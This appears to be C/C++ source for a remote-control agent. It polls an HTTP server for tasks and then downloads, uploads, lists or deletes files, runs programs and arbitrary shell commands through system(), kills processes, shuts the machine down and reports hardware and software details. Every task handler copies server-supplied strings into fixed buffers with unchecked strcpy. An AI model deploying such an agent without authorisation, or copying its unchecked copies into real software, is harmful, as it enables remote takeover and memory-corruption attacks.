#include "XControl_Hdr.h"

XHTHREAD XControl_Thread_HttpTask()
{
	TCHAR tszTaskUrl[MAX_PATH];
	memset(tszTaskUrl, '\0', MAX_PATH);

	while (bIsRun)
	{
		int nBLen = 0;
		CHAR* ptszMsgBody = NULL;

		_stprintf(tszTaskUrl, _T("api?function=gettask&serial=%llu"), m_nTaskSerial);

		if (APIClient_Http_Request("GET", st_ServiceConfig.tszTaskUrl, NULL, NULL, &ptszMsgBody, &nBLen))
		{
			XControl_Task_ProtocolParse(ptszMsgBody, nBLen);
			BaseLib_OperatorMemory_FreeCStyle((XPPMEM)&ptszMsgBody);
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(st_ServiceConfig.st_Time.nHTTPThreadTime));
	}
	return 0;
}
//////////////////////////////////////////////////////////////////////////
BOOL XControl_Task_ProtocolParse(LPCSTR lpszMsgBuffer, int nMsgLen)
{
	XCONTROL_PROTOCOLINFO st_ProtocolInfo;
	memset(&st_ProtocolInfo, '\0', sizeof(XCONTROL_PROTOCOLINFO));

	if (!Protocol_Parse_JsonRoot(lpszMsgBuffer, nMsgLen, &st_ProtocolInfo))
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:JSON解析错误");
		return FALSE;
	}
	//获得任务序列号
	if (st_ProtocolInfo.nTaskSerial != m_nTaskSerial)
	{
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:任务序列号不正确");
		return FALSE;
	}
	m_nTaskSerial++;
	//执行任务
	switch (st_ProtocolInfo.nOPCode)
	{
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DOWNFILE:
	{
		CHAR tszFileUrl[MAX_PATH];
		CHAR tszSaveUrl[MAX_PATH];

		memset(tszFileUrl, '\0', MAX_PATH);
		memset(tszSaveUrl, '\0', MAX_PATH);
		strcpy(tszFileUrl, st_ProtocolInfo.tszSourceStr);
		strcpy(tszSaveUrl, st_ProtocolInfo.tszDestStr);

		XHANDLE xhTask = APIClient_File_Create(tszFileUrl, tszSaveUrl);
		if (NULL == xhTask)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:下载任务处理失败,错误码:%lX", APIClient_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETHELP_FILEINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETHELP_FILEINFO));

			if (APIClient_File_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_NETHELP_APICLIENT_FILE_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		APIClient_File_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEFILE:
		CHAR tszDelFile[MAX_PATH];
		memset(tszDelFile, '\0', MAX_PATH);

		strcpy(tszDelFile, st_ProtocolInfo.tszSourceStr);
		if (-1 == remove(tszDelFile))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:删除文件任务处理失败,错误码:%d", errno);
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_DELETEDIR:
		CHAR tszDelDir[MAX_PATH];
		memset(tszDelDir, '\0', MAX_PATH);

		strcpy(tszDelDir, st_ProtocolInfo.tszSourceStr);
		if (!SystemApi_File_DeleteMutilFolder(tszDelDir))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:删除文件夹任务处理失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_UPFILE:
	{
		CHAR tszUPFile[MAX_PATH];
		CHAR tszUPUrl[MAX_PATH];

		memset(tszUPFile, '\0', MAX_PATH);
		memset(tszUPUrl, '\0', MAX_PATH);
		strcpy(tszUPFile, st_ProtocolInfo.tszSourceStr);
		strcpy(tszUPUrl, st_ProtocolInfo.tszDestStr);

		XHANDLE xhTask = APIClient_File_Create(tszUPFile, tszUPUrl, FALSE);
		if (NULL == xhTask)
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:FTP上传任务处理失败,错误码:%lX", APIClient_GetLastError());
			return FALSE;
		}
		while (TRUE)
		{
			NETHELP_FILEINFO st_TaskInfo;
			memset(&st_TaskInfo, '\0', sizeof(NETHELP_FILEINFO));

			if (APIClient_File_Query(xhTask, &st_TaskInfo))
			{
				if (ENUM_NETHELP_APICLIENT_FILE_STATUS_DOWNLOADDING != st_TaskInfo.en_DownStatus)
				{
					break;
				}
			}
		}
		APIClient_File_Delete(xhTask);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_GETLIST:
	{
		int nMsgLen = 0;
		int nListCount = 0;
		CHAR** ppszFileList;
		CHAR tszMsgBuffer[4096];
		CHAR tszFindPath[MAX_PATH];
		CHAR tszPostUrl[MAX_PATH];

		memset(tszMsgBuffer, '\0', sizeof(tszMsgBuffer));
		memset(tszFindPath, '\0', MAX_PATH);
		memset(tszPostUrl, '\0', MAX_PATH);

		strcpy(tszFindPath, st_ProtocolInfo.tszSourceStr);
		strcpy(tszPostUrl, st_ProtocolInfo.tszDestStr);

		if (SystemApi_File_EnumFile(tszFindPath, &ppszFileList, &nListCount))
		{
			Protocol_Packet_ListFile(tszMsgBuffer, &nMsgLen, &ppszFileList, nListCount);
			BaseLib_OperatorMemory_Free((XPPPMEM)&ppszFileList, nListCount);

			if (!APIClient_Http_Request("POST", tszPostUrl, tszMsgBuffer))
			{
				XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:发送文件列表失败,地址:%s,错误码:%lX", tszPostUrl, APIClient_GetLastError());
				return FALSE;
			}
		}
		else
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求文件列表失败,错误码:%lX", SystemApi_GetLastError());
		}
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_EXEC:
	{
		DWORD dwProcessID = 0;
		CHAR tszExecFile[MAX_PATH];
		CHAR tszExecShow[MAX_PATH];

		memset(tszExecFile, '\0', MAX_PATH);
		memset(tszExecShow, '\0', MAX_PATH);
		strcpy(tszExecFile, st_ProtocolInfo.tszSourceStr);
		strcpy(tszExecShow, st_ProtocolInfo.tszDestStr);

		if (SystemApi_Process_CreateProcess(&dwProcessID, tszExecFile, NULL, _ttoi(tszExecShow)))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, "HTTP任务:请求创建进程成功,进程:%s", tszExecFile);
		}
		else
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求创建进程:%s 失败,错误码:%lX", tszExecFile, SystemApi_GetLastError());
		}
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_POPMESSAGE:
	{
		CHAR tszMessageBox[MAX_PATH];
		memset(tszMessageBox, '\0', MAX_PATH);

		strcpy(tszMessageBox, st_ProtocolInfo.tszSourceStr);

#ifdef _MSC_BUILD
		MessageBoxA(NULL, tszMessageBox, "提示", MB_OK);
#endif
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_INFO, "HTTP任务:请求弹出消息:%s", tszMessageBox);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_STOPPROCESS:
		CHAR tszProcessName[MAX_PATH];
		memset(tszProcessName, '\0', MAX_PATH);

		strcpy(tszProcessName, st_ProtocolInfo.tszSourceStr);

		if (!SystemApi_Process_Stop(tszProcessName))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求停止进程失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_SHUTDOWN:
		CHAR tszShutDownType[MAX_PATH];
		memset(tszShutDownType, '\0', MAX_PATH);

		strcpy(tszShutDownType, st_ProtocolInfo.tszSourceStr);

		if (!SystemApi_System_Shutdown(_ttoi(tszShutDownType)))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求关机失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_ECMD:
		CHAR tszExecCmd[MAX_PATH];
		memset(tszExecCmd, '\0', MAX_PATH);

		strcpy(tszExecCmd, st_ProtocolInfo.tszSourceStr);

		if (-1 == system(tszExecCmd))
		{
			XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求执行命令失败,错误码:%lX", SystemApi_GetLastError());
			return FALSE;
		}
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_REPORT:
	{
		CHAR tszType[MAX_PATH];
		CHAR tszIPAddr[MAX_PATH];

		memset(tszType, '\0', MAX_PATH);
		memset(tszIPAddr, '\0', MAX_PATH);

		strcpy(tszType, st_ProtocolInfo.tszSourceStr);
		strcpy(tszIPAddr, st_ProtocolInfo.tszDestStr);

		if (0 == _ttoi(tszType))
		{
			int nHWLen = 4096;
			CHAR tszHWBuffer[4096];
			memset(tszHWBuffer, '\0', sizeof(tszHWBuffer));
			XControl_Info_HardWare(tszHWBuffer, &nHWLen);
			APIClient_Http_Request("POST", tszIPAddr, tszHWBuffer);
		}
		else
		{
			int nSWLen = 4096;
			CHAR tszSWBuffer[4096];
			memset(tszSWBuffer, '\0', sizeof(tszSWBuffer));
			XControl_Info_SoftWare(tszSWBuffer, &nSWLen);
			APIClient_Http_Request("POST", tszIPAddr, tszSWBuffer);
		}
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_ENUMDEVICE:
	{
		int nACount = 0;
		int nVCount = 0;
		AVHELP_DEVICEINFO** ppSt_AudioList;
		AVHELP_DEVICEINFO** ppSt_VideoList;

		int nMsgLen = 0;
		TCHAR tszMsgBuffer[4096];
		memset(tszMsgBuffer, '\0', sizeof(tszMsgBuffer));

		AVHelp_Device_EnumDevice(&ppSt_AudioList, &ppSt_VideoList, &nACount, &nVCount);
		Protocol_Packet_EnumDevice(tszMsgBuffer, &nMsgLen, &ppSt_AudioList, &ppSt_VideoList, nACount, nVCount);
		BaseLib_OperatorMemory_Free((void***)&ppSt_AudioList, nACount);
		BaseLib_OperatorMemory_Free((void***)&ppSt_VideoList, nVCount);
	}
	break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_SERIAL:
		CHAR tszSerial[MAX_PATH];
		memset(tszSerial, '\0', MAX_PATH);

		strcpy(tszSerial, st_ProtocolInfo.tszSourceStr);
		m_nTaskSerial = _ttoi64(tszSerial);
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_USER:
		break;
	case XENGINE_COMMUNICATION_PROTOCOL_OPERATOR_CODE_BS_NOTHINGTODO:
		break;
	default:
		XLOG_PRINT(xhLog, XENGINE_HELPCOMPONENTS_XLOG_IN_LOGLEVEL_ERROR, "HTTP任务:请求的操作码不支持,操作码:%d", st_ProtocolInfo.nOPCode);
		return FALSE;
	}
	return TRUE;
}